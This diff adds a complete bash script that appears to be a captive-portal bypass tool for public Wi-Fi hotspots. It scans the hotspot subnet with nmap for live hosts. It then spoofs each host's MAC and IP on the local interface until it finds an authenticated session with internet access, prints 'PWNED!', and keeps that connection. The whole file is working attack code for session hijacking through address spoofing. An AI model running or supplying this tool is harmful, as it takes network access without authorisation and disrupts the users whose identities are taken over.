@@ -1,0 +1,446 @@
+#!/usr/bin/env bash
+ 
+# --- Logging and Error Handling ---
+DEBUG=0 # Set to 1 for verbose debug output via --debug flag
+LOG_FILE=""
+
+# Function to log messages. Prepends with a timestamp.
+# Usage: log "INFO" "This is an info message"
+log() {
+    local type="$1"
+    local message="$2"
+    # Don't log until LOG_FILE is set in create_tmp
+    [[ -z "$LOG_FILE" ]] && return
+    local timestamp
+    timestamp=$(date "+%Y-%m-%d %H:%M:%S")
+
+    # All logs go to stderr to not interfere with command substitution stdout
+    case "$type" in
+        "INFO")
+            echo "[$timestamp] [INFO]  $message" >> "$LOG_FILE"
+            ;;
+        "WARN")
+            echo "[$timestamp] [WARN]  $message" >> "$LOG_FILE"
+            ;;
+        "ERROR")
+            echo "[$timestamp] [ERROR] $message" >> "$LOG_FILE"
+            ;;
+        "DEBUG")
+            if [[ "$DEBUG" -eq 1 ]]; then
+                echo "[$timestamp] [DEBUG] $message" >> "$LOG_FILE"
+            fi
+            ;;
+    esac
+}
+
+# check if required packages are installed
+required() {
+	echo "Checking for required packages..."
+	local missing_packages=0
+	local reqs=("sipcalc" "nmap")
+
+	# macchanger is Linux-only
+	if [[ "$(uname)" == "Linux" ]]; then
+		reqs+=("macchanger")
+	fi
+
+	for cmd in "${reqs[@]}"; do
+		if ! command -v "$cmd" >/dev/null 2>&1; then
+			echo "ERROR: Required command '$cmd' is not installed." >&2
+			missing_packages=1
+		fi
+	done
+
+	if [[ "$missing_packages" -eq 1 ]]; then
+		echo "Please install missing packages and restart the script." >&2
+		exit 1
+	else
+		echo "All required packages found."
+	fi
+}
+
+# Check for running as root.
+check_sudo() {
+  if [[ "$EUID" -ne 0 ]]; then
+    echo "ERROR: This script must be run as root. Use 'sudo'." >&2
+    exit 1
+  fi
+}
+  
+# Create a temporary folder for script work.
+create_tmp() {
+  unset tmp
+  tmp="$(mktemp -q -d "${TMPDIR:-/tmp}/hackaptive_XXXXXXXXXX")" || {
+    echo "ERROR: Unable to create temporary folder. Aborting." >&2
+    exit 1 # No log function here, as it's a fundamental failure
+  }
+  LOG_FILE="$tmp/script.log"
+  # Now that the log file exists, we can start logging
+  log "INFO" "Temporary directory created at $tmp"
+  log "INFO" "Log file is $LOG_FILE"
+}
+  
+# Clean tmp/ on exit due to any reason.
+clean_up() {
+  log "INFO" "Cleaning up temporary files..."
+  # Keep tmp dir if in debug mode for inspection
+  if [[ "$DEBUG" -eq 0 ]]; then
+    rm -rf "$tmp"
+  else
+    log "INFO" "Debug mode is on. Temporary directory preserved at $tmp"
+  fi
+  trap 0
+  exit
+}
+
+#let user optionally define network parameters through cli flags
+
+args() {
+	while [[ $# -gt 0 ]]; do
+		case "$1" in
+			-h|--help)
+				echo "$0 - Captive Portal Bypass Tool - Hijack IP and MAC for valid credentials"
+				echo ""
+				echo " $0 [parameters] "
+				echo ""
+				echo "Parameters:"
+				echo ""
+				echo "-h ...  | ... --help                        ......... Show this help menu"
+				echo "-d ...  | ... --debug                       ......... Enable debug logging"
+				echo "-s ...  | ... --ssid=<name>             ......... Wifi SSID w/ Captive Portal"
+				echo "-i ...  | ... --iface=<name>           ......... Network Interface"
+				echo "-g ...  | ... --gateway=<ip>           ......... Network Gateway"
+				echo "-p ...  | ... --localip=<ip>           ......... Local IP address"
+				echo "-b ...  | ... --broadcast=<ip>        .......... Broadcast IP"
+				echo "-n ...  | ... --netmask=<cidr>        ......... Network Mask (CIDR, e.g. 24)"
+				echo "-m ... | ... --ipmask=<ip/cidr>     ......... IP with Mask (e.g. 192.168.1.10/24)"
+				echo "-w ...  | ... --network=<net/cidr>  ......... Network (e.g. 192.168.1.0/24)"
+				echo "-a ...  | ... --macaddress=<mac>     ......... Your original MAC Address"
+				echo "-S ...  | ... --netaddress=<ip>        ......... Network Address (e.g. 192.168.1.0)"
+				exit 0
+				;;
+			-d|--debug)
+				DEBUG=1
+				shift
+				;;
+			-s)
+				shift
+				ssid="$1"
+				shift
+				;;
+			--ssid*)
+				ssid=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-i)
+				shift
+				iface="$1"
+				shift
+				;;
+			--iface*)
+				iface=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-g)
+				shift
+				gw="$1"
+				shift
+				;;
+			--gateway*)
+				gw=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-p)
+				shift
+				ip="$1"
+				shift
+				;;
+			--localip*)
+				ip=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-b)
+				shift
+				bcast="$1"
+				shift
+				;;
+			--broadcast*)
+				bcast=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-m)
+				shift
+				ipmask="$1"
+				shift
+				;;
+			--ipmask*)
+				ipmask=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-n)
+				shift
+				nmask="$1"
+				shift
+				;;
+			--netmask*)
+				nmask=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-w)
+				shift
+				nwork="$1"
+				shift
+				;;
+			--network*)
+				nwork=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			-a)
+				shift
+				macadd="$1"
+				shift
+				;;
+			--macaddress*)
+				macadd=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;	
+			-S) # Was a duplicate -s
+				shift
+				netadd="$1"
+				shift
+				;;
+			--netaddress*)
+				netadd=$(echo "$1" | sed -e 's/^[^=]*=//g')
+				shift
+				;;
+			*)
+				log "WARN" "Unknown argument: $1"
+				break
+				;;
+		esac
+	done
+}
+
+# Set any network parameters that were not provided via arguments
+set_defaults() {
+	local os
+	os=$(uname)
+	log "INFO" "Operating System detected: $os"
+
+	if [[ "$os" == "Linux" ]]; then
+		: "${iface:=$(ip -o -4 route show to default | awk '/dev/ {print $5}' | head -n1)}"
+		: "${ip:=$(ip -o -4 route get 1 | awk '/src/ {print $7}')}"
+		: "${gw:=$(ip -o -4 route show to default | awk '/via/ {print $3}' | head -n1)}"
+		: "${macadd:=$(ip -o addr show dev "$iface" | awk '/link\/ether/ {print $2}' | tr '[:upper:]' '[:lower:]')}"
+		: "${ssid:=$(iw dev "$iface" link | awk '/SSID/ {print $NF}')}"
+		: "${bcast:=$(ip -o -4 addr show dev "$iface" | awk '/brd/ {print $6}')}"
+		: "${ipmask:=$(ip -o -4 addr show dev "$iface" | awk '/inet/ {print $4}')}"
+	elif [[ "$os" == "Darwin" ]]; then # macOS
+		: "${iface:=$(route -n get default | awk '/interface:/ {print $2}')}"
+		: "${ip:=$(ifconfig "$iface" | awk '/inet / {print $2}')}"
+		: "${gw:=$(route -n get default | awk '/gateway:/ {print $2}')}"
+		: "${macadd:=$(ifconfig "$iface" | awk '/ether/ {print $2}' | tr '[:upper:]' '[:lower:]')}"
+		: "${ssid:=$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk -F': ' '/ SSID/ {print $2}')}"
+		: "${bcast:=$(ifconfig "$iface" | awk '/broadcast/ {print $6}')}"
+		local subnet_mask
+		subnet_mask=$(ifconfig "$iface" | awk '/netmask/ {print $4}')
+		local cidr
+		cidr=$(sipcalc "$ip" "$subnet_mask" | awk '/Network mask \(bits\)/ {print $5}')
+		: "${ipmask:=${ip}/${cidr}}"
+	fi
+
+	: "${nmask:=$(cut -d/ -f2 <<< "$ipmask")}"
+	: "${netadd:=$(sipcalc "$ipmask" | awk '/Network address/ {print $NF}')}"
+	: "${nwork:=${netadd}/${nmask}}"
+	
+	# Exit if we couldn't determine the interface
+	if [[ -z "$iface" ]]; then
+		log "ERROR" "Could not determine network interface. Please specify with -i/--iface."
+		echo "ERROR: Could not determine network interface. Please specify with -i/--iface." >&2
+		exit 1
+	fi
+
+	log "DEBUG" "--- Network Parameters ---"
+	log "DEBUG" "Interface:      $iface"
+	log "DEBUG" "SSID:             $ssid"
+	log "DEBUG" "IP Address:       $ip"
+	log "DEBUG" "IP with Mask:     $ipmask"
+	log "DEBUG" "Gateway:          $gw"
+	log "DEBUG" "MAC Address:      $macadd"
+	log "DEBUG" "Broadcast:        $bcast"
+	log "DEBUG" "Netmask (CIDR):   $nmask"
+	log "DEBUG" "Network Address:  $netadd"
+	log "DEBUG" "Network (CIDR):   $nwork"
+	log "DEBUG" "--------------------------"
+}
+
+# Split up big networks into smaller chunks of /24.
+calc_network() {
+  log "INFO" "Calculating network ranges for '$ssid' hotspot."
+  echo "Exploring network in \"$ssid\" Wi-Fi hotspot..."
+  if [[ "$nmask" -lt 24 ]]; then
+    sipcalc -s 24 "$nwork" \
+    | awk '/Network/ {print $3}' > "$tmp"/networklist.$$.txt
+    log "INFO" "Splitting up network $nwork into smaller /24 chunks."
+    echo "Network $nwork is large; splitting into smaller chunks."
+  else
+    echo "${nwork%/*}" > "$tmp"/networklist.$$.txt
+    log "INFO" "Network $nwork is a /24 or smaller, no split needed."
+  fi
+}
+
+get_router_mac() {
+  log "INFO" "Attempting to find MAC address for gateway $gw..."
+  getroutermac=$(nmap -n -sn -PR -PS -PA -PU -T5 "$gw" | grep -E -o '[A-Z0-9:]{17}' | tr '[:upper:]' '[:lower:]')
+  if [[ -z "$getroutermac" ]]; then
+      log "WARN" "Could not determine MAC address for gateway $gw. Will not be able to skip it during hijack."
+  else
+      log "INFO" "Gateway MAC address found: $getroutermac"
+  fi
+}
+
+# Select network, seet netmask, scan it for IP and MAC and hijack them. Repeat.
+
+main() {
+  while read -r networkfromlist; do
+    if [[ "$nmask" -lt 24 ]]; then
+      network="$networkfromlist/24"
+    else
+      network="$networkfromlist/$nmask"
+    fi
+  log "INFO" "Scanning for active hosts in $network..."
+  echo "Looking for active hosts in $network. Please wait..."
+  nmap -n -sn -PR -PS -PA -PU -T5 --exclude "$ip,$gw" "$network" \
+  | awk '/for/ {print $5} ; /Address/ {print $3}' \
+  | sed '$!N;s/\n/ - /' > "$tmp"/hostsalive.$$.txt
+  
+  if [[ ! -s "$tmp/hostsalive.$$.txt" ]]; then
+      log "WARN" "No active hosts found in network $network."
+      echo "No active hosts found in $network."
+      continue
+  fi
+
+  # Set founded IP and MAC for wireless interface.
+    while read -r hostline; do
+      newip="$(printf "%s\n" "$hostline" | awk '{print $1}')"
+      newmac="$(printf "%s\n" "$hostline" \
+                   | awk '{print $3}' \
+                   | tr '[:upper:]' '[:lower:]')"
+
+      if [[ -z "$newip" || -z "$newmac" ]]; then
+          log "WARN" "Could not parse IP and MAC from line: '$hostline'. Skipping."
+          continue
+      fi
+
+      if [[ "$getroutermac" != "$newmac" ]]; then
+            echo "Trying to hijack $newip - $newmac"
+            log "INFO" "Attempting to hijack IP: $newip with MAC: $newmac"
+
+            local os
+            os=$(uname)
+            if [[ "$os" == "Linux" ]]; then
+                ip link set "$iface" down
+                log "DEBUG" "Set interface $iface down."
+                ip link set dev "$iface" address "$newmac"
+                log "DEBUG" "Set MAC address to $newmac."
+                ip link set "$iface" up
+                log "DEBUG" "Set interface $iface up."
+                ip addr flush dev "$iface"
+                log "DEBUG" "Flushed IP addresses from $iface."
+                ip addr add "$newip/$nmask" broadcast "$bcast" dev "$iface"
+                log "DEBUG" "Added IP $newip/$nmask to $iface."
+                ip route add default via "$gw"
+                log "DEBUG" "Added default route via $gw."
+            elif [[ "$os" == "Darwin" ]]; then
+                ifconfig "$iface" down
+                log "DEBUG" "Set interface $iface down."
+                ifconfig "$iface" ether "$newmac"
+                log "DEBUG" "Set MAC address to $newmac."
+                ifconfig "$iface" inet "$newip" netmask "$nmask" broadcast "$bcast" up
+                log "DEBUG" "Set IP $newip, brought interface up."
+                route add default "$gw"
+                log "DEBUG" "Added default route via $gw."
+            fi
+            sleep 1
+  
+            log "DEBUG" "Network configured. Pinging 8.8.8.8 to test connectivity..."
+            # Check if Google DNS pingable with our new IP and MAC.
+            ping -c1 -w1 8.8.8.8 >/dev/null 2>&1
+            if [[ $? -eq 0 ]]; then
+              log "INFO" "SUCCESS! Internet connection established with IP $newip and MAC $newmac."
+              echo ""
+              echo "PWNED! Internet connection established."
+              echo "IP:   $newip"
+              echo "MAC:  $newmac"
+              echo "You can now surf the internet. This script will exit to preserve the connection."
+              exit 0
+            else
+              log "INFO" "Hijack attempt failed for $newip."
+            fi
+      else
+            log "INFO" "Skipped $newip - $newmac (matches gateway MAC)."
+      fi
+  
+    done < "$tmp"/hostsalive.$$.txt
+    rm -rf "$tmp"/hostsalive.$$.txt
+    log "INFO" "Finished checking hosts in this network chunk."
+  
+  done < "$tmp"/networklist.$$.txt
+  rm -rf "$tmp"/networklist.$$.txt
+  log "WARN" "No suitable hosts found to hijack across all scanned networks."
+  echo "No luck! Suitable hosts not found. Restoring original settings."
+  
+  # Restore original MAC and IP.
+  log "INFO" "Restoring original network configuration..."
+  local os
+  os=$(uname)
+  if [[ "$os" == "Linux" ]]; then
+      ip link set "$iface" down
+      ip link set dev "$iface" address "$macadd"
+      ip link set "$iface" up
+      ip addr flush dev "$iface"
+      ip addr add "$ipmask" broadcast "$bcast" dev "$iface"
+      ip route add default via "$gw"
+  elif [[ "$os" == "Darwin" ]]; then
+      ifconfig "$iface" down
+      ifconfig "$iface" ether "$macadd"
+      local original_ip
+      original_ip=$(echo "$ipmask" | cut -d/ -f1)
+      ifconfig "$iface" inet "$original_ip" netmask "$nmask" broadcast "$bcast" up
+      route add default "$gw"
+  fi
+  log "INFO" "Original network settings restored."
+}
+
+# Functions start here.
+trap clean_up 0 1 2 3 15
+trap 'echo "Script terminated by user."; log "WARN" "Script terminated by user (SIGTERM)."; exit' SIGTERM
+
+# Main execution flow
+
+# Create temp dir and log file first
+create_tmp
+
+# Parse arguments after creating tmp dir so logging works for unknown args
+args "$@"
+
+log "INFO" "Captive Portal Bypass Script Started."
+[[ "$DEBUG" -eq 1 ]] && log "DEBUG" "Debug mode is enabled."
+
+# Run pre-flight checks
+log "DEBUG" "Running pre-flight checks..."
+required
+check_sudo
+
+# Set any missing network parameters
+log "DEBUG" "Setting default network parameters for any missing values..."
+set_defaults
+
+# Run the main logic
+get_router_mac
+calc_network
+main
+
+log "INFO" "Script finished."
+
+exit 0
